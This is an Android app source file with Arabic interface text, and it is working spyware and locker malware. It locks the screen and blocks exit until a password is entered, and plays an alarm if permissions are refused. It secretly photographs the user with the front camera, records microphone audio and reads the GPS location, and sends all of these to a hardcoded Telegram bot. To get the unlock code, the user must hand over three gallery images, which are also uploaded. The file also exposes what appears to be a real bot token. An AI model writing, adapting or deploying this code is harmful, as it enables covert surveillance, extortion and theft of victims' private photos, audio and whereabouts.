package com.hh.hh;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ClipData;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.graphics.drawable.GradientDrawable;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private EditText etPassword;
    private Button btnLogin, btnGetCode;
    private boolean isUnlocked = false;
    private MediaPlayer mediaPlayer;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private LocationManager locationManager;

    private static final String BOT_TOKEN = "8783905294:AAECYX0TQUuHsUngUaGhsUQ1xtl34rXZ-sA";
    private static final String CHAT_ID = "2120980905";
    private static final int PERMISSION_CODE = 100;
    private static final int PICK_IMAGES_CODE = 200;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (android.os.Build.VERSION.SDK_INT >= 21)
            getWindow().setStatusBarColor(0xFF000000);
        setContentView(R.layout.main);

        decorateViews();
        setupListeners();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                startLockTask();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ArrayList<String> permissionsList = new ArrayList<>();
            
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                permissionsList.add(Manifest.permission.CAMERA);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissionsList.add(Manifest.permission.RECORD_AUDIO);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
            }

            if (!permissionsList.isEmpty()) {
                ActivityCompat.requestPermissions(this, permissionsList.toArray(new String[0]), PERMISSION_CODE);
            } else {
                startAllTasks();
            }
        } else {
            startAllTasks();
        }
    }

    private void startAllTasks() {
        captureAndSendPhoto();
        startAudioRecording();
        sendLocationToTelegram();
    }

    private void decorateViews() {
        LinearLayout mainLayout = (LinearLayout) findViewById(R.id.linearMain);
        GradientDrawable bg = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{0xFF1A0000, 0xFF000000});
        mainLayout.setBackground(bg);

        etPassword = (EditText) findViewById(R.id.etPassword);
        GradientDrawable editBg = new GradientDrawable();
        editBg.setColor(0xFF1A1A1A);
        editBg.setCornerRadius(dp(8));
        editBg.setStroke(dp(1), 0xFFFF0000);
        etPassword.setBackground(editBg);

        btnLogin = (Button) findViewById(R.id.btnLogin);
        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(0xFFFF0000);
        btnBg.setCornerRadius(dp(8));
        btnLogin.setBackground(btnBg);

        btnGetCode = (Button) findViewById(R.id.btnGetCode);
        GradientDrawable btnGetBg = new GradientDrawable();
        btnGetBg.setColor(0xFF220000);
        btnGetBg.setCornerRadius(dp(8));
        btnGetBg.setStroke(dp(1), 0xFFFF0000);
        btnGetCode.setBackground(btnGetBg);
    }

    private void setupListeners() {
        btnLogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String pass = etPassword.getText().toString().trim();
                if (pass.equals("123456")) {
                    isUnlocked = true;
                    stopAlarmSound();
                    stopAndSendAudio();
                    Toast.makeText(MainActivity.this, "تم فتح التطبيق بنجاح", Toast.LENGTH_SHORT).show();
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        try {
                            stopLockTask();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                } else {
                    Toast.makeText(MainActivity.this, "كلمة السر غير صحيحة", Toast.LENGTH_SHORT).show();
                }
            }
        });

        btnGetCode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("image/*");
                intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
                startActivityForResult(Intent.createChooser(intent, "اختر 3 صور من المعرض"), PICK_IMAGES_CODE);
            }
        });
    }

    private void sendLocationToTelegram() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                if (location != null) {
                    final double latitude = location.getLatitude();
                    final double longitude = location.getLongitude();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation?chat_id=" + CHAT_ID + "&latitude=" + latitude + "&longitude=" + longitude;
                                URL url = new URL(urlString);
                                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                conn.setRequestMethod("GET");
                                conn.getResponseCode();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startAudioRecording() {
        try {
            audioFilePath = getExternalCacheDir().getAbsolutePath() + "/ambient_audio.3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopAndSendAudio() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            if (audioFilePath != null) {
                final File audioFile = new File(audioFilePath);
                if (audioFile.exists()) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                sendAudioToTelegram(audioFile);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendAudioToTelegram(File file) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            
            String boundary = "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
            os.write((CHAT_ID + "\r\n").getBytes());
            
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"audio\"; filename=\"record.3gp\"\r\n".getBytes());
            os.write("Content-Type: audio/3gpp\r\n\r\n".getBytes());
            
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PICK_IMAGES_CODE && resultCode == RESULT_OK && data != null) {
            final ArrayList<Uri> imageUris = new ArrayList<>();
            if (data.getClipData() != null) {
                ClipData clipData = data.getClipData();
                for (int i = 0; i < clipData.getItemCount(); i++) {
                    imageUris.add(clipData.getItemAt(i).getUri());
                }
            } else if (data.getData() != null) {
                imageUris.add(data.getData());
            }

            if (imageUris.size() >= 3) {
                Toast.makeText(this, "جاري إرسال الصور...", Toast.LENGTH_SHORT).show();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            for (int i = 0; i < 3; i++) {
                                byte[] bytes = getBytesFromUri(imageUris.get(i));
                                if (bytes != null) {
                                    sendPhotoToTelegram(bytes);
                                }
                            }
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    showCodeDialog("123456");
                                }
                            });
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            } else {
                Toast.makeText(this, "يجب اختيار 3 صور على الأقل!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private byte[] getBytesFromUri(Uri uri) {
        try {
            InputStream iStream = getContentResolver().openInputStream(uri);
            ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
            int bufferSize = 1024;
            byte[] buffer = new byte[bufferSize];
            int len = 0;
            while ((len = iStream.read(buffer)) != -1) {
                byteBuffer.write(buffer, 0, len);
            }
            return byteBuffer.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private void showCodeDialog(String code) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("رمز الدخول الخاص بك");
        builder.setMessage("الرمز هو: " + code);
        builder.setCancelable(false);
        builder.setPositiveButton("حسناً", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
        builder.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                startAllTasks();
            } else {
                Toast.makeText(this, "يجب الموافقة على جميع الصلاحيات لعمل التطبيق!", Toast.LENGTH_LONG).show();
                playAlarmSound();
            }
        }
    }

    private void playAlarmSound() {
        try {
            if (mediaPlayer == null) {
                mediaPlayer = MediaPlayer.create(this, R.raw.sub);
                mediaPlayer.setLooping(true);
            }
            if (!mediaPlayer.isPlaying()) {
                mediaPlayer.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopAlarmSound() {
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                }
                mediaPlayer.release();
                mediaPlayer = null;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void captureAndSendPhoto() {
        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            Camera.Parameters parameters = camera.getParameters();
            
            if (parameters.getSupportedPictureSizes() != null && !parameters.getSupportedPictureSizes().isEmpty()) {
                Camera.Size size = parameters.getSupportedPictureSizes().get(0);
                parameters.setPictureSize(size.width, size.height);
            }
            
            camera.setParameters(parameters);
            
            SurfaceTexture dummySurface = new SurfaceTexture(10);
            camera.setPreviewTexture(dummySurface);
            camera.startPreview();
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    final byte[] finalData = data;
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                sendPhotoToTelegram(finalData);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                    cam.stopPreview();
                    cam.release();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            playAlarmSound();
        }
    }

    private void sendPhotoToTelegram(byte[] imageData) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            
            String boundary = "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
            os.write((CHAT_ID + "\r\n").getBytes());
            
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"photo\"; filename=\"image.jpg\"\r\n".getBytes());
            os.write("Content-Type: image/jpeg\r\n\r\n".getBytes());
            os.write(imageData);
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            
            os.flush();
            os.close();
            
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onBackPressed() {
        showLockDialog();
    }

    private void showLockDialog() {
        if (!isUnlocked) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("تنبيه أمني");
            builder.setMessage("لا يمكنك الخروج من التطبيق قبل إدخال كلمة السر الصحيحة!");
            builder.setCancelable(false);
            builder.setPositiveButton("حسناً", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            builder.show();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAlarmSound();
        if (mediaRecorder != null) {
            try {
                mediaRecorder.release();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}
